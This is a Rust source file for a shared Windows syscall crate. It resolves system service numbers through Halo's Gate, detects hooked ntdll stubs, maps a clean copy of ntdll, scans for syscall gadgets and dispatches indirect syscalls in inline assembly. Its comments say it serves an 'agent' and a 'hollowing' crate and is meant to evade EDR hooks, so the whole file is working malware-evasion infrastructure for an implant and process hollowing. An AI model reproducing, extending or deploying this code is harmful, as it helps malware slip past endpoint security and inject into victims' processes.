//! Shared Windows NT direct-syscall infrastructure.
//!
//! Provides SSN (System Service Number) resolution, a clean-ntdll mapper, a
//! simple `do_syscall` dispatcher, and a `syscall!` convenience macro.  Both
//! the `agent` and `hollowing` crates depend on this crate so that neither has
//! to carry its own duplicate copy of Halo's Gate / clean-mapping logic.
//!
//! Unlike the richer `agent::syscalls` module, this crate does **not** include
//! the optional `stack-spoof` feature.  Stack spoofing is intentionally kept
//! in the agent crate where it is feature-gated and can pull additional ntdll
//! gadget data.  The simpler indirect-syscall path used here is still fully
//! evasive against most IAT/SSDT-hook-based EDR strategies.
//!
//! # Initialisation
//!
//! Call [`init_syscall_infrastructure`] once (e.g. at process start or before
//! any hollowing operation) to map a clean copy of ntdll.dll and pre-populate
//! the SSN cache.  Subsequent calls are no-ops.  If initialisation fails the
//! crate gracefully falls back to bootstrap-mode SSN resolution (Halo's Gate
//! against the loaded, potentially hooked, ntdll).

#![cfg(windows)]

use anyhow::anyhow;
use std::sync::{Mutex, OnceLock};
use std::collections::HashMap;

// ─── Syscall target ────────────────────────────────────────────────────────

/// A resolved Windows NT syscall descriptor.
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    /// System Service Number — passed in EAX before the `syscall` instruction.
    pub ssn: u32,
    /// Address of a valid `syscall; ret` (or `syscall`) gadget inside ntdll's
    /// `.text` section.  Used as the indirect-call target to avoid EDR
    /// detection of `syscall` instructions in agent/hollowing code pages.
    pub gadget_addr: usize,
}

// ─── Statics ───────────────────────────────────────────────────────────────

/// Base address of the clean-mapped ntdll.dll image (0 = not yet mapped).
static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();

/// Per-call SSN cache: function name → (ssn, gadget_addr).
static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();

// ─── Hook-byte detection & stub parsing ────────────────────────────────────

/// Attempt to extract the SSN and gadget address directly from an unhooked
/// `Nt*` stub at `func_addr`.  Returns `None` when the stub appears hooked
/// (no `syscall` instruction found within the first 64 bytes).
#[cfg(windows)]
unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
    for j in 0..bytes.len().saturating_sub(1) {
        if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
            for k in (0..j).rev() {
                if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
                    let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                    return Some(SyscallTarget {
                        ssn,
                        gadget_addr: func_addr + j,
                    });
                }
            }
        }
    }
    None
}

/// Validate that a gadget at `addr` of `len` bytes is safe to execute:
///   1. The region is committed and executable.
///   2. The gadget does not straddle a 4 KiB page boundary.
#[cfg(windows)]
unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
    use winapi::um::memoryapi::VirtualQuery;
    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    if VirtualQuery(
        addr as *const _,
        &mut mbi,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
    ) == 0
    {
        return false;
    }
    if mbi.State != MEM_COMMIT {
        return false;
    }
    const PAGE_EXECUTE: u32 = 0x10;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
    let prot = mbi.Protect;
    if prot != PAGE_EXECUTE
        && prot != PAGE_EXECUTE_READ
        && prot != PAGE_EXECUTE_READWRITE
        && prot != PAGE_EXECUTE_WRITECOPY
    {
        return false;
    }
    let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
    if addr + len > region_end {
        return false;
    }
    let page_start = addr & !0xFFF;
    addr + len <= page_start + 0x1000
}

/// Collect virtual addresses of all `Nt`-prefixed exports from `module_base`.
#[cfg(windows)]
unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};

    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return Vec::new();
    }
    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
    if export_rva == 0 || export_size == 0 {
        return Vec::new();
    }

    let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
    let n_names = dir.NumberOfNames as usize;
    if n_names == 0 {
        return Vec::new();
    }

    let name_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNames as usize) as *const u32,
        n_names,
    );
    let ordinals = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
        n_names,
    );
    let func_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfFunctions as usize) as *const u32,
        dir.NumberOfFunctions as usize,
    );

    let mut result = Vec::new();
    for i in 0..n_names {
        let name_ptr = (module_base + name_rvas[i] as usize) as *const u8;
        if *name_ptr != b'N' || *name_ptr.add(1) != b't' {
            continue;
        }
        if !(*name_ptr.add(2)).is_ascii_uppercase() {
            continue;
        }
        let ord = ordinals[i] as usize;
        if ord >= func_rvas.len() {
            continue;
        }
        let func_rva = func_rvas[ord] as usize;
        if func_rva >= export_rva && func_rva < export_rva + export_size {
            continue; // forwarded
        }
        result.push(module_base + func_rva);
    }
    result
}

/// Halo's Gate: infer `target_addr`'s SSN from parseable neighbours.
#[cfg(windows)]
unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
    let mut vas = collect_nt_export_vas(ntdll_base);
    if vas.is_empty() {
        return None;
    }
    vas.sort_unstable();

    let target_idx = vas.iter().position(|&va| va == target_addr)?;

    const MAX_DELTA: usize = 8;
    for delta in 1..=MAX_DELTA {
        if let Some(&upper_va) = vas.get(target_idx + delta) {
            if let Some(t) = parse_syscall_stub(upper_va) {
                if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
                    log::debug!(
                        "nt_syscall::halo_gate: SSN {} inferred for {:#x} (upper+{})",
                        inferred, target_addr, delta
                    );
                    return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
                }
            }
        }
        if delta <= target_idx {
            if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
                let inferred = t.ssn + delta as u32;
                log::debug!(
                    "nt_syscall::halo_gate: SSN {} inferred for {:#x} (lower-{})",
                    inferred, target_addr, delta
                );
                return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
            }
        }
    }
    log::warn!(
        "nt_syscall::halo_gate: could not infer SSN for {:#x} within {} neighbours",
        target_addr, MAX_DELTA
    );
    None
}

/// Scan the loaded ntdll `.text` section for a valid `syscall; ret` gadget.
/// Returns the gadget's address, or `None` if none was found.
#[cfg(windows)]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            let code = std::slice::from_raw_parts(start as *const u8, size);
            for j in 0..size.saturating_sub(3) {
                if code[j] == 0x0f && code[j + 1] == 0x05 {
                    let candidate = start + j;
                    let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

/// Bootstrap SSN resolution: inspect prologue bytes for hook detection, then
/// use Halo's Gate for SSN and a `.text` scan for the gadget if hooked.
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
        let is_hooked = !(
            (prologue[0] == 0x4C && prologue[1] == 0x8B)
            || prologue[0] == 0xB8
        );

        if !is_hooked {
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        } else {
            log::warn!(
                "nt_syscall: {func_name} stub appears hooked \
                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
                prologue[0],
                prologue[1]
            );
        }

        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;

        if is_hooked {
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget { ssn: ssn_target.ssn, gadget_addr });
            }
            log::warn!(
                "nt_syscall: {func_name}: no clean gadget found in .text; \
                 using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

// ─── Clean ntdll mapping ───────────────────────────────────────────────────

/// Map a read-only file-backed copy of ntdll.dll from disk using bootstrap
/// syscalls (Halo's Gate).  Returns the base address of the mapping.
fn map_clean_ntdll() -> anyhow::Result<usize> {
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let sys_open = get_bootstrap_ssn("NtOpenFile")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtOpenFile"))?;
    let sys_section = get_bootstrap_ssn("NtCreateSection")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtCreateSection"))?;
    let sys_map = get_bootstrap_ssn("NtMapViewOfSection")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtMapViewOfSection"))?;

    let gadget = sys_open.gadget_addr; // use first resolved gadget throughout

    let mut ntdll_path: Vec<u16> = format!(r"\??\{}\System32\ntdll.dll", sysroot)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((ntdll_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (ntdll_path.len() * 2) as u16;
        obj_name.Buffer = ntdll_path.as_mut_ptr();

        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length =
            std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

        let mut io_status = [0u64; 2];
        let mut h_file: *mut winapi::ctypes::c_void = std::ptr::null_mut();

        let s = do_syscall(
            sys_open.ssn,
            gadget,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000u64, // SYNCHRONIZE | FILE_READ_DATA
                &mut obj_attr as *mut _ as u64,
                io_status.as_mut_ptr() as u64,
                1u64,  // FILE_SHARE_READ
                0x20u64, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );
        if s < 0 {
            return Err(anyhow!("nt_syscall: NtOpenFile(ntdll) NTSTATUS {:#010x}", s as u32));
        }

        let mut h_section: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let s = do_syscall(
            sys_section.ssn,
            gadget,
            &[
                &mut h_section as *mut _ as u64,
                0x000F_001Fu64, // SECTION_ALL_ACCESS
                0u64,
                0u64,
                0x20u64,       // PAGE_EXECUTE_READ
                0x0100_0000u64, // SEC_IMAGE
                h_file as u64,
            ],
        );
        pe_resolve::close_handle(h_file as *mut core::ffi::c_void);
        if s < 0 {
            return Err(anyhow!("nt_syscall: NtCreateSection(ntdll) NTSTATUS {:#010x}", s as u32));
        }

        let mut base_addr: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let s = do_syscall(
            sys_map.ssn,
            gadget,
            &[
                h_section as u64,
                (-1isize) as u64, // NtCurrentProcess()
                &mut base_addr as *mut _ as u64,
                0u64,
                0u64,
                0u64,
                &mut view_size as *mut _ as u64,
                1u64, // ViewShare
                0u64,
                0x20u64, // PAGE_EXECUTE_READ
            ],
        );
        pe_resolve::close_handle(h_section as *mut core::ffi::c_void);
        if s < 0 || base_addr.is_null() {
            return Err(anyhow!("nt_syscall: NtMapViewOfSection(ntdll) NTSTATUS {:#010x}", s as u32));
        }

        Ok(base_addr as usize)
    }
}

// ─── Public SSN resolution API ─────────────────────────────────────────────

/// Read the SSN from a named export in the clean-mapped ntdll at `base`.
unsafe fn read_export_ssn(base: usize, func_name: &str) -> anyhow::Result<SyscallTarget> {
    let mut name = func_name.as_bytes().to_vec();
    name.push(0);
    let hash = pe_resolve::hash_str(&name);
    let func_addr = pe_resolve::get_proc_address_by_hash(base, hash)
        .ok_or_else(|| anyhow!("nt_syscall: {} not found in clean ntdll", func_name))?;
    parse_syscall_stub(func_addr)
        .ok_or_else(|| anyhow!("nt_syscall: could not parse SSN for {}", func_name))
}

/// Initialise the syscall infrastructure: map a clean copy of ntdll.dll and
/// warm up the SSN cache.  Safe to call multiple times; subsequent calls are
/// no-ops.
///
/// Returns `Ok(())` on success.  On failure the crate degrades gracefully to
/// bootstrap-mode resolution (Halo's Gate against the loaded ntdll).
pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
    match map_clean_ntdll() {
        Ok(base) => {
            let _ = CLEAN_NTDLL.set(base);
            log::debug!("nt_syscall: clean ntdll mapped at {:#x}", base);
            Ok(())
        }
        Err(e) => {
            log::warn!("nt_syscall: clean ntdll mapping failed: {e}; falling back to bootstrap mode");
            Err(e)
        }
    }
}

/// Resolve the SSN and gadget address for `func_name`.
///
/// Resolution order:
/// 1. Per-session cache (fast path).
/// 2. Clean-mapped ntdll (if [`init_syscall_infrastructure`] succeeded).
/// 3. Bootstrap / Halo's Gate against the loaded (potentially hooked) ntdll.
pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(&(ssn, gadget_addr)) = cache.lock().unwrap().get(func_name) {
        return Ok(SyscallTarget { ssn, gadget_addr });
    }

    let target = match CLEAN_NTDLL.get().copied().filter(|&b| b != 0) {
        Some(base) => unsafe { read_export_ssn(base, func_name) }?,
        None => get_bootstrap_ssn(func_name)
            .ok_or_else(|| anyhow!("nt_syscall: bootstrap SSN resolution failed for '{func_name}'"))?,
    };

    cache
        .lock()
        .unwrap()
        .insert(func_name.to_string(), (target.ssn, target.gadget_addr));
    Ok(target)
}

// ─── Syscall dispatcher ────────────────────────────────────────────────────

/// Dispatch a Windows NT system call directly via the `syscall` instruction,
/// bypassing potentially hooked ntdll stubs.
///
/// # Safety
///
/// All argument values must be valid for the target NT function.  `ssn` and
/// `gadget_addr` must have been obtained from [`get_syscall_id`].
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    #[cfg(target_arch = "x86_64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
        let nstack: usize = stack_args.len();
        let stack_ptr: *const u64 = stack_args.as_ptr();
        let status: i32;

        core::arch::asm!(
            // Save RSP; restore after the call.
            "mov r14, rsp",
            // Allocate 0x20 shadow space + stack args (8 bytes each), aligned.
            "mov rax, rcx",
            "shl rax, 3",
            "add rax, 0x20 + 15",
            "and rax, -16",
            "sub rsp, rax",
            // Copy stack arguments into [rsp+0x20 .. rsp+0x20 + nstack*8].
            "test rcx, rcx",
            "jz 2f",
            "lea rdi, [rsp + 0x20]",
            "cld",
            "rep movsq",
            "2:",
            // Load syscall arguments and number.
            "mov rcx, {a1}",
            "mov rdx, {a2}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov r11, {gadget}",
            // Indirect syscall: call the `syscall; ret` gadget inside ntdll.
            "call r11",
            // Restore stack.
            "mov rsp, r14",
            ssn    = in(reg) ssn,
            gadget = in(reg) gadget_addr,
            inout("rcx") nstack => _,
            inout("rsi") stack_ptr => _,
            a1 = in(reg) a1,
            a2 = in(reg) a2,
            inlateout("r8")  a3 => _,
            inlateout("r9")  a4 => _,
            lateout("rax") status,
            out("rdx") _, out("r10") _, out("r11") _,
            out("r14") _, out("r15") _,
            out("rdi") _,
        );

        status
    }
    #[cfg(target_arch = "aarch64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let a5 = args.get(4).copied().unwrap_or(0);
        let a6 = args.get(5).copied().unwrap_or(0);
        let a7 = args.get(6).copied().unwrap_or(0);
        let a8 = args.get(7).copied().unwrap_or(0);
        let status: i32;
        core::arch::asm!(
            "mov x8, {ssn}",
            "mov x0, {a1}",
            "mov x1, {a2}",
            "mov x2, {a3}",
            "mov x3, {a4}",
            "mov x4, {a5}",
            "mov x5, {a6}",
            "mov x6, {a7}",
            "mov x7, {a8}",
            "svc #0",
            ssn = in(reg) ssn as u64,
            a1 = in(reg) a1, a2 = in(reg) a2,
            a3 = in(reg) a3, a4 = in(reg) a4,
            a5 = in(reg) a5, a6 = in(reg) a6,
            a7 = in(reg) a7, a8 = in(reg) a8,
            lateout("x0") status,
            out("x8") _,
        );
        status
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        let _ = (ssn, gadget_addr, args);
        // Unsupported architecture; return STATUS_NOT_IMPLEMENTED.
        0xC000_0002u32 as i32
    }
}

// ─── Public macro ──────────────────────────────────────────────────────────

/// Dispatch an NT system call by name.
///
/// Resolves the SSN and gadget address via [`get_syscall_id`] (with caching),
/// then calls [`do_syscall`] with the provided arguments cast to `u64`.
///
/// Returns `Result<i32>` — `Ok(ntstatus)` on a successful SSN lookup, or an
/// `Err` if the function name cannot be resolved.  A negative NTSTATUS in the
/// `Ok` variant indicates that the kernel call itself failed; callers should
/// check `result < 0` for NT-level errors.
///
/// # Example
///
/// ```rust,ignore
/// let status = nt_syscall::syscall!(
///     "NtAllocateVirtualMemory",
///     h_process, &mut base as *mut _ as u64,
///     0u64, &mut size as *mut _ as u64,
///     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
/// )?;
/// if status < 0 { return Err(anyhow!("NtAllocateVirtualMemory failed")); }
/// ```
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {
        $crate::get_syscall_id($func_name).map(|__target| {
            let __args: &[u64] = &[$($args as u64),*];
            unsafe { $crate::do_syscall(__target.ssn, __target.gadget_addr, __args) }
        })
    };
}
